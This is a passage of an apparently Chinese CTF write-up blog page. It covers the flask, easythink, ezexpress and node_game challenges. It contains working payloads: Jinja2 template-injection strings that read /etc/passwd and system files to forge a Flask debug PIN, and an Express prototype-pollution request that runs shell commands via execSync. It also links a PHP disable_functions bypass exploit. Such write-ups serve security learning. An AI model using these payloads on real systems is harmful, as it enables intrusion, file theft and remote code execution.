+<h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p>可以模板注入参考链接：<a href="https://www.kingkk.com/2018/08/Flask-debug-pin安全问题/" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p>
+<p>这个exp可以任意文件读，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/etc/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取/proc/self/cgroup</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/proc/self/cgroup&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取mac地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/sys/class/net/eth0/address&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成pin之后，import os就可以直接看flag了</p>
+<h3 id="easythink"><a href="#easythink" class="headerlink" title="easythink"></a>easythink</h3><p>tp6.0的session可控写shell的洞，写进去之后是绕过bypass disable function，用7.2通杀的那个exp就好了</p>
+<p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
+<h3 id="ezexpress"><a href="#ezexpress" class="headerlink" title="ezexpress"></a>ezexpress</h3><p>upperCase可以绕过注册，参考这个：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>之后是框架的原型链污染，污染outputFunctionName，这个出过好几次了，由于不能数据外带，而且有回显，可以直接将结果返回在info界面</p>
+<p>exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;lua&quot;:&quot;aaa&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor.__load(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;); //&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p>搞了一晚上，不知道哪里出了问题，大致思路是http头注入，插一个post包来ssrf，传pug模板来getshell</p>
+<p>和HackIM 2020 的split second很像，但是不知道哪里出了问题</p>
+<p>后来作者发了wp：<a href="http://blog.5am3.com/2020/02/11/ctf-node1/" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/</a></p>
+<p>应该是还有没编码的地方，很迷，心态很崩</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/14/five86/" rel="next" title="five86-1/2 writeup">
+                <i class="fa fa-chevron-left"></i> five86-1/2 writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#招聘网站"><span class="nav-number">1.</span> <span class="nav-text">招聘网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezupload"><span class="nav-number">2.</span> <span class="nav-text">ezupload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-number">3.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyphp"><span class="nav-number">4.</span> <span class="nav-text">babyphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easysqli"><span class="nav-number">5.</span> <span class="nav-text">easysqli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#blacklist"><span class="nav-number">6.</span> <span class="nav-text">blacklist</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezsqli"><span class="nav-number">7.</span> <span class="nav-text">ezsqli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flask"><span class="nav-number">8.</span> <span class="nav-text">flask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easythink"><span class="nav-number">9.</span> <span class="nav-text">easythink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezexpress"><span class="nav-number">10.</span> <span class="nav-text">ezexpress</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#node-game"><span class="nav-number">11.</span> <span class="nav-text">node_game</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
